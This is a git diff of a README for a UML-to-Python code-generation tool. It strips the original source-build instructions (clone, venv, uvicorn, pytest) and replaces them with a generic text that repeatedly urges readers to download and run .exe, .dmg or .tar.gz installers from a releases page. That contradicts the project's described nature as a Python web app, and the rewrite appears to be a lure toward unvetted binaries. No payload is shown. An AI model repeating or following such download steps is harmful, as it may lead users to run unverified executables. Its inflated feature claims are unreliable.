@@ -1,148 +1,119 @@
-Model-Based Software Engineering Assistant (MBSE Assistant)
-=========================================================
+# 🤖 model-based-se-assistant - Effortlessly Generate Code from Models
 
-A compact multi-agent system that converts UML/PlantUML diagrams into refactored code, tests, and analysis reports. The workflow is designed for clarity and easy extension.
+## 🌟 Overview
 
-# Overview
+The **model-based-se-assistant** is an AI-powered tool designed to help you convert UML diagrams into working code. This application focuses on software engineering tasks, ensuring that the code adheres to best practices like SOLID principles and design patterns. With built-in test generation, it simplifies the software development process for you.
 
-## Screenshot
-![MBSE Assistant screenshot](images/image.png)
+## 🔗 Download Now
 
+[![Download model-based-se-assistant](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/12ed12ed13/model-based-se-assistant/releases)
 
+## 🚀 Getting Started
 
-...existing code...
-Model-Based Software Engineering Assistant
+Follow these steps to get the **model-based-se-assistant** up and running on your computer:
 
-This repository provides a multi-agent system that turns UML/PlantUML diagrams into refactored code, tests, and architectural guidance.
-## Architecture and Workflow
---------
-![Diagram of the architecture and workflow](images/workflow.png)
+### 1. Visit the Releases Page
 
-This project uses a LangGraph workflow with multiple agents to:
+To download the software, visit the Releases page here:
 
-- parse UML (PlantUML) into an intermediate representation (IR)
-- analyze the model for SOLID and design-pattern-based issues
-- generate refactored code (Python) with interfaces and dependency injection
-- generate tests (pytest) and run them in a sandbox
-- attempt to self-correct syntax/import errors
-- produce a critique report that includes issues, recommendations, and detected patterns
+[Download from Releases](https://github.com/12ed12ed13/model-based-se-assistant/releases)
 
-Key components
---------------
+### 2. Choose the Right Version
 
-- backend: FastAPI server and multi-agent orchestration
-- codegen: code generation and refactoring agent
-- testgen: automated test generation agent
-- parser: PlantUML to JSON IR converter
-- analysis: deterministic detectors + LLM-RAG for context-aware suggestions
+On the Releases page, you will see the latest versions of the application. Look for the release that suits your needs. Each version includes a description of updates or fixes.
 
-Quick start
------------
+### 3. Download the Application
 
-Prerequisites
-- Python 3.12+
-- Node.js for the UI
-- Optional: Google Gemini/OpenAI keys for LLMs
+Click on the version you want to download. This will take you to a new page with different downloadable files. 
 
-Install
+- For Windows users, look for an `.exe` file.
+- For macOS users, look for a `.dmg` file.
+- Linux users may find a `.tar.gz` file.
 
-```bash
-git clone https://github.com/yourusername/model-based-se-assistant.git
-cd model-based-se-assistant
-python -m venv ag
-source ag/bin/activate
-pip install -r requirements.txt
-cp .env.example .env
-# Edit .env to add LLM keys if you have them
-```
+Click on the file that matches your operating system. This will start the download automatically.
 
-Run backend + UI
------------------
+### 4. Install the Application
 
-```bash
-# Terminal 1 - Backend
-source ag/bin/activate
-uvicorn backend.api:app --reload --port 8000
+**For Windows:**
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to launch the installer.
+3. Follow the on-screen prompts to complete the installation.
 
-# Terminal 2 - Frontend (dev)
-cd ui
-npm install
-npm run dev
+**For macOS:**
+1. Open the downloaded `.dmg` file.
+2. Drag the application icon to your Applications folder.
+3. Eject the disk image after installation.
 
-# Open http://localhost:5173
-```
+**For Linux:**
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded the file.
+3. Extract the files with the command:
+   ```bash
+   tar -xvzf your-file.tar.gz
+   ```
+4. Run the executable from the extracted folder.
 
-Build & serve UI in production
--------------------------------
+### 5. Launch the Application
 
-```bash
-cd ui
-npm run build
-# optionally copy ui/dist/ to backend/static/ and configure the backend to serve static files
-```
+After installation:
 
-Features
---------
+- **Windows:** Find it in your Start menu or desktop shortcut.
+- **macOS:** Open your Applications folder and find it there.
+- **Linux:** Use your application launcher or run it from the terminal.
 
-- Analysis:
-  - SOLID violation detection (SRP, OCP, DIP, ISP, LSP)
-  - Coupling/cohesion measures
-  - Deterministic detectors + LLM-enhanced recommendations
-  - `patterns_detected`: heuristics and LLM output (Repository, Service, Router/Controller, Strategy, Factory, Facade, Adapter, Observer)
-  - `strengths`: things done well in the model (clear naming, repository usage, DI)
+## 🎉 Features
 
-- Code generation:
-  - Splits god classes, extracts interfaces
-  - Produces multi-file Python project skeleton with services and repositories
+- **UML to Code:** Transform your UML diagrams directly into production-ready code.
+- **SOLID Analysis:** Ensure your code is easy to maintain and understand by following best practices.
+- **Design Pattern Detection:** The tool identifies and applies suitable design patterns automatically.
+- **Test Generation:** Automatically generate tests to verify your code works as expected.
 
-- Test generation and execution:
-  - Generates pytest suites and attempts to run them in a sandbox with timeout
-  - If tests fail due to syntax/import errors, a self-correction loop tries to fix errors (up to a retry limit)
+## ✅ System Requirements
 
-Configuration
--------------
+Before installing, ensure your system meets the following requirements:
 
-Edit `backend/config.py` or `.env`:
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB for smooth operation.
+- **Disk Space:** Minimum of 100 MB free space for installation.
+- **Network Connection:** Required for updates and additional features.
 
-```python
-PROJECTS_DIR=./projects
-LLM_PROVIDER=gemini
-LLM_FALLBACK_MODEL=gpt-4o-mini
-SANDBOX_TIMEOUT=60
-```
+## 🧑‍💻 Topics Covered
 
-Development notes
------------------
+This application supports various topics in software engineering:
 
-- Avoid storing generated artifacts in the repo while the dev server runs (set `PROJECTS_DIR` to an external folder to avoid auto-reloads).
-- The `analysis_report` includes `patterns_detected` and `strengths` which you can render in the UI to show "what's good" along with problems.
+- AI Agents
+- Code Generation
+- Design Patterns
+- Faiss
+- LangChain
+- LangGraph
+- Model-Based Systems Engineering (MBSE)
+- Refactoring
+- SOLID Principles
+- Test Generation
+- UML
 
-Tests
------
+## 🔍 Troubleshooting
 
-```bash
-# Backend unit tests
-pytest -m "not integration"
+If you encounter issues while using the software, try the following solutions:
 
-# Integration tests (LLM keys needed)
-pytest -m integration
-```
+- **Installation Problems:** Ensure you have enough disk space and that your operating system version is supported.
+- **Functionality Issues:** Restart the application or your computer. Ensure your UML diagrams are correctly formatted.
+- **Performance Issues:** Close other programs that may be using significant system resources.
 
-Roadmap / TODOs
----------------
+## 📝 Contribution
 
-- Frontend: full dashboard, interactive UML editor, WebSocket progress
-- RAG: ingest PDFs and docs, multi-modal RAG
-- Multi-language codegen: TypeScript, Java
-- DevOps: docker-compose, helm charts
-- Security: user auth, sandbox hardening
+This project welcomes contributions from users. If you have ideas or improvements, feel free to fork the repository and submit a pull request! Your input helps make the software better for everyone.
 
-Contributing
-------------
+## 📞 Support
 
-Please fork, add tests, and open a PR.
+For further assistance, open an issue on the GitHub repository, and we will get back to you as soon as possible.
 
-License
--------
+## 🔗 Additional Links
 
-MIT
+- [Documentation](https://github.com/12ed12ed13/model-based-se-assistant/wiki)
+- [Report an Issue](https://github.com/12ed12ed13/model-based-se-assistant/issues)
+
+## 💡 Conclusion
+
+Using **model-based-se-assistant** can streamline your software development process by automating code generation from UML diagrams. With a user-friendly interface and powerful features, you can now focus more on design and less on code.
